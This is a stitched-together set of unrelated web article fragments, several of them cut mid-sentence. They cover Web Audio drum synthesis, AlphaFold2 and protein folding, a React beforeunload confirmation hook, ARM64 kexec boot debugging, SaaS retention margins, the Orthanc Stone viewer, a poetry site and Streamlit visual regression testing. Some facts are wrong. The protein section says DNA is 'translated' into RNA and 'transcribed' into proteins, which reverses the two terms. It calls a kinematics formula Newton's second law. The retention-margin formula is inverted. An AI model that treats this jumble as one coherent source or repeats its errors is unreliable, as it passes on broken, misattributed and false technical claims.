<p>…But if you click the button again, you get an error. You can only play a source node once. Fortunately, they are cheap to create, and we can still use the same audio buffer. We’ll just create it inside our button’s event listener.</p>
<div data-language="js"><pre><code>button<span>.</span><span>addEventListener</span><span>(</span><span>"click"</span><span>,</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> whiteNoiseSource <span>=</span> audioContext<span>.</span><span>createBufferSource</span><span>(</span><span>)</span><span>;</span>
  whiteNoiseSource<span>.</span>buffer <span>=</span> buffer<span>;</span>
  whiteNoiseSource<span>.</span><span>connect</span><span>(</span>primaryGainControl<span>)</span><span>;</span>

  whiteNoiseSource<span>.</span><span>start</span><span>(</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span></code></pre></div>

<p>Now you can click all you want.</p>
<h2>Creating a Snare Sound with Filters</h2>
<p>Snare drums create their signature rattle using several springs that are held taught underneath the drum. Old 8-bit games would use a white noise generator to create a snare sound, as you can hear in <a href="https://www.youtube.com/watch?v=z4hsGK8A1qY" rel="nofollow">this 8-bit remix of a classic song</a>.</p>
<p>White noise is nice, but it doesn’t sound much like any kind of musical instrument. We can build on our white noise generator to create a snare sound, using filters.</p>
<p>In audio processing, a filter is some process which changes an audio signal in some way. We can use a highpass filter to cut off all of the noise that exists below a certain frequency, leaving us with just the high frequencies of noise. We can create this filter using the <code>BiquadFilterNode</code> audio node.</p>
<p>To help tell the difference, lets create another button.</p>
<div data-language="js"><pre><code><span>const</span> snareFilter <span>=</span> audioContext<span>.</span><span>createBiquadFilter</span><span>(</span><span>)</span><span>;</span>
snareFilter<span>.</span>type <span>=</span> <span>"highpass"</span><span>;</span>
snareFilter<span>.</span>frequency<span>.</span>value <span>=</span> <span>1500</span><span>;</span> 
snareFilter<span>.</span><span>connect</span><span>(</span>primaryGainControl<span>)</span><span>;</span>


<span>const</span> snareButton <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>"button"</span><span>)</span><span>;</span>
snareButton<span>.</span>innerText <span>=</span> <span>"Snare"</span><span>;</span>
snareButton<span>.</span><span>addEventListener</span><span>(</span><span>"click"</span><span>,</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> whiteNoiseSource <span>=</span> audioContext<span>.</span><span>createBufferSource</span><span>(</span><span>)</span><span>;</span>
  whiteNoiseSource<span>.</span>buffer <span>=</span> buffer<span>;</span>
  whiteNoiseSource<span>.</span><span>connect</span><span>(</span>snareFilter<span>)</span><span>;</span>

  whiteNoiseSource<span>.</span><span>start</span><span>(</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>
document<span>.</span>body<span>.</span><span>appendChild</span><span>(</span>snareButton<span>)</span><span>;</span></code></pre></div>
<p>Go ahead and click on the buttons to hear the effect that the highpass filter has.</p>
<p>There are several other filters built into the BiquadFilterNode, which you can explore on <a href="https://developer.mozilla.org/en-US/docs/Web/API/BiquadFilterNode" rel="nofollow">the MDN page</a>.</p>
<h2>Generating Kick Drums with Oscillators</h2>
<p>We aren’t quite done with our snare yet, but we’re going to take a little diversion and create our kick drum sound. The kick sound will be a low pitched hum. We could create that ourselves using another audio buffer and a sine function, but the Web Audio API gives us tools that make this a lot easier.</p>
<p>Let’s start by creating a button. Inside the button’s click event listener, we’ll create an oscillator node. …</p></div></div>

<p>by Abhirath Batra</p>

<h2 id="tldr">TLDR</h2>

<p>Just yesterday, Deepmind published a <a href="https://deepmind.com/blog/article/alphafold-a-solution-to-a-50-year-old-grand-challenge-in-biology">blog</a> talking about how their AI, AlphaFold2, predicted protein structures in the biennial CASP challenge this year with stunning accuracy. There’s been a lot of buzz in the computational science community discussing the ramifications of their work.</p>

<p>If you’ve seen the buzz and are curious about protein folding, read on…
This post is supposed to capture the motivation and complexity of the problem for an audience familiar with STEM in some way.</p>

<p>Majorly, this is a post close to my heart since protein folding is the broad problem in which I did my Masters’ research. It is the first topic of research I worked in and therefore love talking about!</p>

<hr>

<h2 id="quick-introduction">Quick introduction</h2>

<p>Proteins are fundamental to life, as they quite literally <a href="https://www.youtube.com/watch?v=X_tYrnv_o6A">DO things in the body</a>. They transport molecules, help decode the DNA, and digest the food. Infact, they sit at the functional end of the <a href="https://en.wikipedia.org/wiki/Central_dogma_of_molecular_biology">central dogma of biology</a>(i.e. DNA-&gt; RNA -&gt; Protein ; DNA is translated into RNA which is transcribed into proteins)
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ee/Cdmb.svg/1280px-Cdmb.svg.png" alt="Central Dogma of Biology"></p>

<h2 id="the-fuss-about-structures">The fuss about structures</h2>
<p>If you remember high school, they fold into intricate (quaternary) structures that are highly important to their funciton. Structure matters since a lot of what proteins do as mid-sized molecules depend on them mechanically <strong>docking</strong> with other molecules(throwback to coordinate chemistry!). They exist at a size regime that is a fascinating grey area of where mechanical and chemical effects both matter!
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/97/Docking_representation_2.png/1280px-Docking_representation_2.png">
Common drugs use this fact. For example, they will try to bind competitively with the target of a protein hence preventing its action (that’s how your coffee works!) or attach to a protein at a different site and alter its structure, rendering it useless.</p>

<h2 id="the-fault-in-our-structures">The fault in our structures</h2>
<p>Now proteins are manufactures in ribosomes, at immense speed, with immense precision. But chemical machinery is not without folly. So sometimes it makes mistakes. The sequence stays the same, but like a bead of strings that can be arranged in anyway, it can be misfolded. Misfolded proteins, as you can guess, malfunction! For diseases like Alzhiemer’s, the misfolding of one protein and its aggregation in the brain is one of the primary candidates of being the root cause.</p>

<p>This just means, that studying the 3-D structure of proteins is of high importance. It is also important to study the path taken by proteins to fold that way.</p>

<h2 id="methods-of-measurement">Methods of measurement</h2>
<p>To see particles that small, NMR and XRAY-crystallography are usually used. Both these methods fall short in:</p>
<ol>
  <li>Being able to capture the entire dynamics of a protein. i.e., WATCH the folding process happen; since the timescales are too short.</li>
  <li>Giving a model that can help predict the 3-d structure of a protein given its sequence</li>
  <li>Providing insights into other “meta-stable” conformations which the protein may assume owing to random forces.</li>
</ol>

<p><strong>NB : NMR is able to capture proteins dynamics technically. I’m not too familiar with the shortcomings of solution state NMR. If you have questions though, I’d be happy to point you to my friends in TIFR Hyderabad’s National NMR facility who can help answer questions.</strong></p>

<p>These measurements are important because they can help us understand WHY a protein misfolded, and also, how a mutated protein could look folded and thus behave!</p>

<h2 id="enter-computers">Enter, Computers!</h2>

<p>Since experimental methods don’t answer these questions, we turn to computational methods. What is done is actually incredibly fascinating!</p>

<p>We model all the atoms as known in a protein as tiny spherical masses, and model the forces between them including electrochemical bonds, nuclear repulsion and weak forces like van der waal forces. Then, we essentially solve newton’s second equation of motion(YEP, the one from 9th grade : \(s_t = u_t + 0.5 * a* t^2\) ) albeit with a different algebraic formulation, for each of the atoms to predict their trajectory in time</p>

<p>Now, if you were using this equation to study a ball thrown into the air and predict it’s entire trajectory, you would want to solve this equation for millisecond intervals, to “see” the ball fly up and then come back down in frames. If you were to take a second interval, the snapshots you would predict would be too far apart.</p>

<p>Similarly for the atoms, since you want to capture the smallest relevant motion, you solve for 2-femto-second intervals, that is the timescale at which molecular bonds move owing to the energy from room temperature heat. This may all seem well and good but it is not!
 IF you were to use a perfect model so that it predicts the real thing, you’d still be modelling a molecule in pure vaccum. However, in the body, all of this exists in a water medium. And in water, properties change because of water’s dipole and kinetic interactions with the system. 
<img src="https://ars.els-cdn.com/content/image/1-s2.0-S1471489210001463-gr1.jpg"></p>

<p>So, you guessed it, the model is made to contain 10s of thousands of water molecules, arranged in a repeating cube, so that the (ideally) modelled system mimics what the molecule will feel inside a living system.</p>

<p>Now, here we have 100s of thousands of particles, with pairwise forces defined for them, that too not just of one kind. From those, we predict their position 2 femto seconds later. Cool. But for how many steps do we have to see this? Well, events of interest such as folding happen at timescales of microseconds to miliseconds. That means, you’d have to do 10^10 iterations of this system to see meaningful events happening.</p>

<h2 id="the-curse-of-dimensionality">The curse of dimensionality</h2>

<p>This method of modelling and simulating trajectories is called <a href="https://en.wikipedia.org/wiki/Molecular_dynamics#:~:text=Molecular%20dynamics%20(MD)%20is%20a,%22evolution%22%20of%20the%20system.">Molecular Dymanics</a></p>

<p>It would be obvious by now that the amount of computational horsepower these simulations takes is so huge that reserachers rely on highly distributed computing to get any useful information. Many labs use accesses to super computers while companies like D.E.Shaw reserach built a special hardware called <a href="https://en.wikipedia.org/wiki/Anton_(computer)">Anton</a> right in the heart of Manhattan to simulate their molecules.</p>

<p>Vijay Pande’s(A16Z) lab from Stanford took the crowdfunding approach with the <a href="https://foldingathome.org/"> Folding at Home </a> Project to allow users to lend their extra computational capacity to contribute to folding proteins from home.</p>

<h2 id="theoretical-work-arounds">Theoretical work-arounds</h2>

<p>Yet other fields exist where in this problem is formalised in a way to reduce computational requirements. The problem of seeing rare events like folding can be formalised through statistical mechanics to be a problem of sampling from a high dimensional probability distribution where we don’t know the entire distribution, but we have a generator which can generate a new random(almost) draw. The simulation generates these states. There are ways that you can use to make this generator generate rarer samples, by let’s say turning up the heat in the system to make the molecules vibrate faster.</p>

<p>Another major way people approach this problem is to think of it in terms of dimensionality reduction, in that a lot of the internal motion of the molecule is actually irrelevant and the true dynamics of the system happen in lower dimensions that capture true transitions. These lower dimensions can be chemical at times, like the dihedral angles on the peptide bonds of 2 amino acids.</p>

<p>Back in IIIT, the approach I worked on with my advisor Dr. Prabhakar Bhimalapuram was trying to use multiple “replicas” of the same system, with a repulsive force between them to make them sample divergent areas of the probability landscape. Here’s a <a href="http://web2py.iiit.ac.in/research_centres/publications/view_publication/mastersthesis/680">link</a> if you’re interested in reading more.</p>

<h2 id="now-comes-in-ai">Now comes In AI.</h2>
<p>AI could help solve the issue in many ways :</p>
<ol>
  <li>Help identify lower dimensions in which to simulate and understand the system</li>
  <li>Predict rare events given a simulated system</li>
  <li>Directly predict folded states</li>
</ol>

<p>The third method is what Deepmind’s AlphaFold2 has done. It is a complex model that treats the molecular structure as a spatial graph and is then trained using ~170,000 protein structures available publicly. Using that they predicted structures in the CASP14 challenge with incredible and astonishing accuracy. Their own blog contains details of all the incredible results they have and links to their previous paper.</p>

<h2 id="perspective">Perspective</h2>

<p>Deepmind has been able to achieve via computational magic, something that we watch nature do in the blink of an eye. Of course, that’s a trite and an unverifiable take on the universe’s functioning. 
However, the real ramifications are huge. If it is true that we know the first principles that govern the universe, and have such methods as shortcuts to make predictions about what nature would have made given those first principles, we have a complete toolkit! With these 2 you can study molecules with remarkable detail. 
It not only opens avenues in understanding nuances of what is already there, but also give a huge boost to synthetic biology.</p>

<p>We would be able to predict the structures of faulty proteins based on  mutations from the genes encoding them. On that, free energy calculations(from the MD regime) could lend us enormous power to predict their behavior in organisms and predict drug targets.</p>

<p>We can enter the regime of large-molecule therapeutics. With this tool, we would be able to design synthetic proteins, predict how they fold, and use them as candidates for all sorts of drugs in the body!</p>

<p>As usual, our ability to predict the future is severely limited!</p>

<p>Mistakes happen. Discarding a user’s form data when he or she attempts to navigate away from the page—perhaps accidentally—can lead to frustrated users, lower form response rates, and abandoned carts.</p>

<p>Many web forms prompt for confirmation before accepting requests to navigate away from the form. These warnings improve the application’s user experience. Unfortunately, they are not trivial to implement. Single-page applications, in particular, must handle navigation within the application as well as external navigation.</p>

<p>This article implements a web form navigation confirmation using TypeScript and React. Traditional web applications are covered first. This solution is then extended to work for single-page applications.</p>

<p>In a traditional web application, users interact with the server by requesting and receiving wholly-formed HTML documents. The user may request and receive other resources such as images or JavaScript files, but each discrete interaction between client and server will result in an HTML document that can be processed and rendered by the browser.</p>

<p>This model of navigation is relatively straightforward:</p>

<ul>
  <li>Resources are offered to the user via URLs.</li>
  <li>Navigating to a new URL will unload the current document and replace it with a new document from the server.</li>
  <li>The current document’s URL can be tracked by the browser and displayed to the user via the address bar.</li>
</ul>

<p>Requesting and rendering documents from the server is not the only function of the web browser. Even though client/server interactions result in the loading of a new page in traditional web applications, client-side scripting is still often employed to improve the UI/UX associated with displaying the server’s data or facilitating the user’s next request.</p>

<p>Modern browsers allow client-side scripts to track and react to many actions that occur within the context of the web page via DOM events. Common examples include reacting to user mouse clicks or keypresses, but DOM events also exist for actions handled by the browser itself such as loading or unloading a document, monitoring the user’s connection, etc. As of November 2020, <a href="https://developer.mozilla.org/en-US/docs/Web/Events">MDN</a> lists 191 events in the “Standard” category representing events defined in official Web specifications which should be supported by standards-compliant browsers.</p>

          The beforeunload event <a href="#the-beforeunload-event">🔗</a>
        
        
      </h3>

<p>The <code>beforeunload</code> event is particularly useful for preventing form data loss. As the name would imply, this event is fired before the current page is unloaded. It prompts the user, who is then able to cancel or confirm the navigation.</p>

<p>At first glance, this is a perfect solution. An event handler can be implemented that checks if the user has provided input. If so, it can prompt for confirmation before unloading the page. However, there are a few caveats.</p>

<p>Most DOM event handlers are flexible. With the right JavaScript, clicking a button could submit a form, change the background image, or navigate to an entirely different page. The <code>beforeunload</code> event is much more restrictive. While a developer <em>could</em> place arbitrary code within the handler, the user will be given a generic confirmation box regardless of the additional code.</p>

<p>This is for good reason! One could imagine a nefarious developer blocking all attempts to navigate away from a page if the event allowed more flexibility.</p>

<p>Earlier browsers limited the outcome to a dialog box but allowed custom text within that dialog. Even this presents a risk. The aforementioned developer could place misleading or annoying text in the confirmation.</p>

<blockquote>
  <p>Your account is currently being upgraded. Navigating away from the site before the upgrade is finished could permanently disable your access! Click “OK” to risk breaking your account.</p>
</blockquote>

<blockquote>
  <p>It looks like you are leaving. Our service is best in class, so this must be a mistake!!!</p>
</blockquote>

<p>A particularly devious developer could even word the confirmation so that the user believes that the confirm/cancel operations are inverted, leading the user to cancel the navigation despite wanting to proceed.</p>

<p>The browser may even choose not to display the confirmation dialog at all, particularly if the user does not appear to have interacted with the page. This bias to conservatism is specifically encouraged by the HTML standard.<sup><a href="#footnotes">1</a></sup></p>

<p>As a final word of caution, setting this event listener currently renders the page “unsalvageable” meaning that it will likely not be reused if the user navigates back during the same session. <a href="https://github.com/whatwg/html/pull/5889">This may be changing soon</a> and is likely not a meaningful concern for most applications.</p>

<p>Despite these minor inconveniences to the developer, <a href="https://caniuse.com/?search=beforeunload">the event is widely supported</a>, and the restrictions likely make the web a much more user-friendly place than it would be without them.</p>

      </h3>

<p>Although the event has broad browser support, there are minor differences in the interface it exposes. <a href="https://html.spec.whatwg.org/#the-beforeunloadevent-interface">According to the specification</a>, invoking the event’s <code>preventDefault</code> method is both necessary and sufficient to indicate that the page desires to show a confirmation. Most browsers <a href="https://caniuse.com/mdn-api_window_beforeunload_event_preventdefault_activation">choose to ignore this guideline</a>. Alternative approaches include <a href="https://caniuse.com/mdn-api_window_beforeunload_event_return_string_activation">returning a string</a> and assigning a string <a href="https://caniuse.com/mdn-api_window_beforeunload_event_event_returnvalue_activation">to the event’s <code>returnValue</code> property</a>. As a practical matter, it is best to implement all three approaches to improve browser coverage.</p>

      </h3>

<p>Having made it through all the background, we can finally implement the hook.</p>

<div><div><pre><code><span>import</span> <span>{</span> <span>useEffect</span> <span>}</span> <span>from</span> <span>'</span><span>react</span><span>'</span>

<span>const</span> <span>handleEvent</span> <span>=</span> <span>(</span><span>e</span><span>:</span> <span>BeforeUnloadEvent</span><span>)</span> <span>=&gt;</span> <span>{</span>

    <span>const</span> <span>message</span> <span>=</span> <span>"</span><span>Your changes may not be saved.</span><span>"</span>

    <span>e</span><span>.</span><span>returnValue</span> <span>=</span> <span>message</span>
    <span>return</span> <span>message</span>
<span>}</span>

<span>export</span> <span>const</span> <span>useUnloadConfirmation</span> <span>=</span> <span>(</span><span>shouldPrompt</span><span>:</span> <span>boolean</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>const</span> <span>eventName</span> <span>=</span> <span>'</span><span>beforeunload</span><span>'</span>
    <span>useEffect</span><span>(()</span> <span>=&gt;</span> <span>{</span>
        <span>if</span> <span>(</span><span>shouldPrompt</span><span>)</span> <span>{</span>
            <span>window</span><span>.</span><span>addEventListener</span><span>(</span><span>eventName</span><span>,</span> <span>handleEvent</span><span>)</span>
            <span>return</span> <span>()</span> <span>=&gt;</span> <span>{</span>
                <span>window</span><span>.</span><span>removeEventListener</span><span>(</span><span>eventName</span><span>,</span> <span>handleEvent</span><span>)</span>
            <span>}</span>
        <span>}</span>
    <span>},</span> <span>[</span><span>shouldPrompt</span><span>])</span>
<span>}</span>
</code></pre></div></div>

<p>The <code>useUnloadConfirmation</code> hook accepts a single parameter indicating if the confirmation should be shown on navigation. This parameter will typically represent whether the form is “dirty” or not. The hook runs an internal <code>useEffect</code> whenever the value of <code>shouldPrompt</code> changes. This <code>useEffect</code> hook adds a handler that runs on <code>beforeunload</code> events. It returns a clean-up function that removes the listener when <code>useEffect</code> runs next or the component unmounts.</p>

<p>Consuming the custom hook is as simple as adding a line to each relevant form component.</p>

<div><div><pre><code><span>const</span> <span>{</span> <span>formIsDirty</span> <span>}</span> <span>=</span> <span>FormLibraryOfChoice</span><span>()</span>
<span>useUnloadConfirmation</span><span>(</span><span>formIsDirty</span><span>)</span>
</code></pre></div></div>
    
      <h2 id="single-page-application-navigation">
        
        
          Single-page application navigation <a href="#single-page-application-navigation">🔗</a>
        
        
      </h2>

<p>The <code>useUnloadConfirmation</code> hook provides a lot of functionality in a small amount of code, but it makes an important assumption: navigation that could cause data loss is preceded by a page unload event.</p>

<p>This assumption tends to hold for traditional web applications. Single-page applications (SPAs), however, were created specifically to violate this assumption.</p>

<p>SPAs create the illusion of navigation—changing the URL and title, displaying new content, etc.—without prompting the page to reload. Without an <code>unload</code> event ever firing, it should be fairly obvious that <code>useUnloadConfirmation</code> will not be effective.</p>

<p>Instead of loading separate HTML documents to retrieve and display content, SPAs load an initial document which is then incrementally updated using client-side scripting combined with AJAX requests. “Navigation” within this single, ever-evolving document is typically handled via the History API.</p>

          The History API <a href="#the-history-api">🔗</a>
        
        
      </h3>

<p>Web browsers keep an ongoing list of addresses visited by the user during the current session. This list allows users to traverse their browsing history using the browser’s “back” and “forward” buttons.</p>

<p>The History API provides a mechanism to view and mutate this list (with restrictions). As a simple example, an SPA could implement a navigation bar with several “links.” Clicking these links does not navigate to a separate document. Instead, it fires a <code>click</code> DOM event which notifies the page’s JavaScript to display new content and uses the History API to modify the URL shown in the address bar.</p>

          Conditionally blocking SPA navigation <a href="#conditionally-blocking-spa-navigation">🔗</a>
        
        
      </h3>

<p>Since any calls to the History API are handled by the page’s JavaScript, which also typically handles determining when navigation should be blocked, there is a conceptually straightforward approach to preventing form data loss: wrap all calls to the History API in code that checks if the page has indicated navigation should be blocked.</p>

      </h3>

<p>Many developers will use a specialized library to handle SPA navigation rather than working directly with the History API. The examples below use React Router and, specifically, its <code>history</code> package. Fortunately, <a href="https://github.com/ReactTraining/history/issues/690#issuecomment-477203090">there are many similarities</a> between <code>history</code> …</p></div></div></div>

    <p>This is one of the unforgettable experience in my engineering life. Last year when we brought-up a ARM64 based platform, we faced lots of hurdles. But this one was very interesting and had lots of surprises. Though this triaging effort tolled multiple frustrating days, I had very good learning. I had to understand <code>kexec_load</code> system call, kernel reboot path and kernel early boot path to root cause the issue. We were using 4.14.19 kernel for the bring-up. But I’ll give code samples from 5.4.14 as it is latest. There is no much code difference.</p>
<p>The boot flow of our new platform was <code>uboot --&gt; service Linux --&gt; main Linux</code>. We had <code>service Linux</code> to offload major hardware initialization work from the bootloader. Also to keep that code platform agnostic [same <code>service Linux</code> ran on x86 platforms too].</p>
<p>To make the jump from <code>service Linux</code> to <code>main Linux</code> we used <code>kexec</code>. The problem here was it took almost 2 minutes for the <code>main Linux</code> to start booting. This was a significant difference while comparing with x86 platforms. And this kind of delay would definitely annoy our customers.</p>
<p>After hundreds of rebuilds and thousands of print statements, I found the cause and fixed the issue. Now that 2 minutes delay was reduced to 4 seconds. Let me just tell you the code flow rather dump you with my debugging methods. I kept deferring from writing this article for almost an year. Because I was afraid of the code references and connecting them to show the flow.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-ix="fade-in-blog-post" id="continue-reading" data-w-id="090c74fd-0c24-ef76-0192-8c569ddeea91"><div><div data-ix="hide-blog-content-block" id="read-post"><div><div><p>Last week we added Gross Margins to our ever growing <a href="https://talkinsaasy.com/saasy-math" target="_blank">SaaSy Math</a> resource page. Gross Margin is a widely used and reported metric, but to truly understand take home profits in the SaaS/Subscription business model we need to take our analysis to the next degree, Retention Margin. Because the subscription business model means customers can (more) freely come and go, subscription startups are in a constant battle to retain these customers (Think Jon Snow in the Battle of the Bastards). Retention margin is the percentage of revenue left after your CORS (gross margins) plus subtracting out your cost to retain a customer (Customer Service, Success, and Marketing) are taken off of your top-line revenue. We will also examine what retention margins analysis across customer segments can help us understand about our customer base.</p><p>Retention margin is important to understand across customer segments similar to CAC because it could reveal customer segments that are “leaky buckets”, or simply, they cost more to keep as a customer than is worth the revenue they generate. Similar to our LTV:CAC ratio, you want to try and understand your retention revenue (customer revenue x retention margin) CAC payback period to make sure that what appear to be high paying customers aren’t costing you so much to retain that they actually could put the business in the red. Below is an example of how retention margins can impact your revenue analysis:</p><figure><p><img alt="CAC Payback without Retention Margins" src="https://uploads-ssl.webflow.com/5fac0bd00b5e8b8e9995239c/5faed3a033b57805d04d987d_CAC%2BPayback%2Bwo%252FRetention%2BMargin.png"></p><figcaption>CAC Payback without Retention Margins</figcaption></figure><figure><p><img alt="CAC Payback with Retention Margins" src="https://uploads-ssl.webflow.com/5fac0bd00b5e8b8e9995239c/5faed3a00d44ee0b402e7b7a_CAC%2BPayback%2Bw%252FRetention%2BMargin.png"></p><figcaption>CAC Payback with Retention Margins</figcaption></figure><p>As you can see in the above area the the customer with the shorter CAC payback period changes when you factor retention margins into your analysis. While Customer A has higher MRR and on top-line revenue looks to have a more attractive CAC payback, what if they submit a bunch more service tickets and spend a lot more time with your customer success and service team which comes at a cost to you? With an 18% lower retention margin, Customer A actually takes longer to payback its CAC than Customer B despite Customer B’s lower MRR number. While a lower CAC payback doesn’t always mean a better customer segment, this is an example of how incorporating retention margins can change the picture of your customer analysis and can provide more context as to how different customer segments are behaving.</p><p>Calculating retention margin is similar to CAC, just looking at Customer Success, Service and Marketing cost (instead of sales and marketing) over a given time period and finding the average number of customers you had each month for that same time period. The formula you want to use is as follows:</p><p><strong>Retention Margin = Top-line Revenue / (Gross Revenue (Revenue - CORS) - Service Cost - Success Cost - Marketing Cost)</strong> </p><p>To find these costs, similar to CAC, you can take financial data to calculate the cost of payroll and other expenses for your Success and Service teams as well as customer marketing spend and plug them into the formula above. You should already have your Gross Margins calculated, if not you can refer to our <a href="https://talkinsaasy.com/saasy-math" target="_blank">SaaSy Math</a> resource to find that formula. One way to help find problematic customer segments is to analyze the Gross-Retention Gap, or the difference between Gross Margins and Retention Margins for each customer segment. When you look at these gaps you can look to see if their is a segment that has a gross margin similar to other segments with a huge gross-retention gap resulting in a low retention margin. This is the result of higher service and success costs typically meaning that this customer segments submits high numbers of service tickets and might be struggling to use your product or service and you might not have product-market fit with this particular group. Segments with a high gross-retention gap might be worth an additional product usage breakdown to understand what is going on.</p><p>With retention margins you can more accurately understand your profitability as well as find the segments of customer that may be negatively impacting your business. We hope that this can be used as a resource to help you find your retention margins and if you have any questions on how to find your retention margins feel free to reach out to us on the <a href="https://talkinsaasy.com/contact" target="_blank">contact</a> page and we would be happy to help. This article was meant to start the conversation around retention margins and we ill be adding all of the formula’s and definitions to our <a href="https://talkinsaasy.com/saasy-math" target="_blank">SaaSy Math</a> page for future access and use if you want to use them as a resource.</p></div></div></div></div></div></div>]]>

      <h2>Description</h2>

      <p>
        This free and open-source plugin provides a cross-platform,
        zero-footprint Web viewer for medical images.
      </p>

      <p>
        Contrarily to most teleradiology solutions, the Stone Web
        viewer is mostly written in C++ thanks
        to <a href="https://en.wikipedia.org/wiki/WebAssembly" target="_blank">WebAssembly</a>. Internally, this viewer is
        the first application to leverage
        the <a href="https://www.orthanc-server.com/static.php?page=stone">Stone of Orthanc</a>
        library.
      </p>

      <p>
        Contrarily to
        the <a href="https://www.orthanc-server.com/static.php?page=orthanc-web-viewer">Orthanc Web
        viewer</a> and to the
        deprecated <a href="https://www.orthanc-server.com/static.php?page=osimis-web-viewer">Osimis
        Web viewer</a>, it does not require server-side computations,
        as it uses the
        standard <a href="https://en.wikipedia.org/wiki/DICOMweb" target="_blank">DICOMweb protocol</a> to communicate with the
        PACS server.

    	<p>Poetry link is a poetry website with a simple twist: every line of every poem can be used to either start
      or finish a new poem. When a line is used in this way, the original poem will be decorated with an arrow that
    links to the new poem. The new poem, likewise, will have an arrow on the borrowed line linking back to the source poem.</p>
      <p>Poetry on this website doesn't have to be ground-breaking or original. Anything you write here could be used
    as inspiration for someone else, and you are free to find a line you like and write something new with it.</p>
      <p>Please direct questions, comments or issues to poetry.link.website@google.com</p>

                <div>
                    <p>In the time I’ve worked at Streamlit, I’ve seen hundreds of impressive data apps ranging from computer vision applications to public health <a href="https://discuss.streamlit.io/t/data-apps-regarding-covid-19/2203">tracking of COVID-19</a> and even simple <a href="https://joelgrus.com/2020/10/02/creating-games-in-streamlit/">children’s games</a>. I believe the growing popularity of Streamlit comes from the fast, iterative workflows through the <a href="https://docs.streamlit.io/en/stable/api.html?highlight=magic#magic-commands">Streamlit “magic”</a> functionality and auto-reloading the front-end upon saving your Python script. Write some code, hit ‘Save’ in your editor, then visually inspect the correctness of each code change. And with the unveiling of <a href="https://www.streamlit.io/sharing">Streamlit sharing</a> for easy deployment of Streamlit apps, you can go from idea to coding to deploying your app in just minutes!</p><p>Once you've created a Streamlit app, you can use automated testing to future-proof it against regressions. In this post, I'll be showing how to programmatically validate that a Streamlit app is unchanged visually using the Python package <a href="https://seleniumbase.io/">SeleniumBase</a>.</p><h2 id="case-study-streamlit-folium">Case Study: streamlit-folium</h2><p>To demonstrate how to create automated visual tests, I’m going to use the <a href="https://github.com/randyzwitch/streamlit-folium">streamlit-folium GitHub repo</a>, a Streamlit Component I created for the <a href="https://python-visualization.github.io/folium/">Folium Python library for leaflet.js</a>. <a href="https://baseweb.design/blog/visual-regression-testing/">Visual regression tests</a> help detect when the layout or content of an app changes, without requiring the developer to manually visually inspect the output each time a line of code changes in their Python library. Visual regression tests also help with cross-browser compatibility of your Streamlit apps and provide advanced warning about new browser versions affecting how your app is displayed.<br></p><figure><img src="https://lh5.googleusercontent.com/QxYpumCHmheacg4M2WTMLd8ZWTr4I2Kvo4zPJnC63cwQfQlXDojmaK3qbsmnNgNpudOaBTfg9CEH8y3MarInWbG4vs4O1ebI0oDvtrat6iPgkCngGPzSPHDyHMS1uUa1Uzclg22L" alt=""><figcaption>Baseline image of streamlit-folium test application</figcaption></figure><h3 id="setting-up-a-test-harness">Setting Up A Test Harness</h3><p>The streamlit-folium test harness has three files:</p><ul><li><a href="https://github.com/randyzwitch/streamlit-folium/blob/master/tests/requirements.txt"><code>tests/requirements.txt</code></a>: the Python packages only needed for testing</li><li><a href="https://github.com/randyzwitch/streamlit-folium/blob/master/tests/app_to_test.py"><code>tests/app_to_test.py</code></a>: the reference Streamlit app to test</li><li><a href="https://github.com/randyzwitch/streamlit-folium/blob/master/tests/test_package.py"><code>tests/test_package.py</code></a>: the tests to demonstrate the package works as intended</li></ul><p>The first step is to create a Streamlit app using the package to be tested and use that to set the baseline. We can then use SeleniumBase to validate that the structure and visual appearance of the app remains unchanged relative to the baseline. </p><p>This post focuses on describing <code>test_package.py</code> since it’s the file that covers how to use SeleniumBase and OpenCV for Streamlit testing.</p><h3 id="defining-test-success">Defining Test Success</h3><p>There are several ways to think about what constitutes looking <em>the same</em> in terms of testing. I chose the following three principles for testing my streamlit-folium package:</p><ol><li>The <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction">Document Object Model (DOM) structure</a> (but not necessarily the values) of the page should remain the same</li><li>For values such as headings, test that those values are exactly equal</li><li>Visually, the app should look the same</li></ol><p>I decided to take these less strict definitions of “unchanged” for testing streamlit-folium, as the internals of the Folium package itself appear to be non-deterministic. Meaning, the same Python code will create the same <em>looking</em> image, but the generated HTML will be different.</p><h2 id="testing-using-seleniumbase">Testing Using SeleniumBase</h2><p>SeleniumBase is an all-in-one framework written in Python that wraps the <a href="https://www.selenium.dev/">Selenium WebDriver</a> project for browser automation. SeleniumBase has two functions that we can use for the first and second testing principles listed above: <a href="https://seleniumbase.io/examples/visual_testing/ReadMe/#automated-visual-regression-testing">check_window</a>, which tests the DOM structure and <a href="https://seleniumbase.io/help_docs/method_summary/">assert_text</a>, to ensure a specific piece of text is shown on the page. </p><p>To check the DOM structure, we first need a baseline, which we can generate using the <code>check_window</code> function. The <code>check_window</code> has two behaviors, based on the required <code>name</code> argument:</p><ul><li>If a folder &lt;<strong>name&gt;</strong> within the <code>visual_baseline/&lt;Python file&gt;.&lt;test function name&gt;</code> path does not exist, this folder will be created with all of the baseline files</li><li>If the folder <em>does exist</em>, then SeleniumBase will compare the current page against the baseline at the specified accuracy level</li></ul><p>You can see an example of calling <a href="https://github.com/randyzwitch/streamlit-folium/blob/master/tests/test_package.py#L19">check_window</a> and the resulting <a href="https://github.com/randyzwitch/streamlit-folium/tree/master/tests/visual_baseline/test_package.test_basic/first_test">baseline files</a> in the streamlit-folium repo. In order to keep the baseline constant between runs, I committed these files to the repo; if I were to make any substantive changes to the app I am testing (<code>app_to_test.py</code>), I would need to remember to set the new baseline or the tests would fail.</p><p>With the baseline folder now present, running check_window runs the comparison test. I chose to run the test at <strong>Level 2</strong>, with the level definitions as follows:</p><ul><li><strong>Level 1 (least strict)</strong>: HTML tags are compared to <a href="https://github.com/randyzwitch/streamlit-folium/blob/master/tests/visual_baseline/test_package.test_basic/first_test/tags_level_1.txt">tags_level1.txt</a></li><li><strong>Level 2</strong>: HTML tags and attribute names are compared to <a 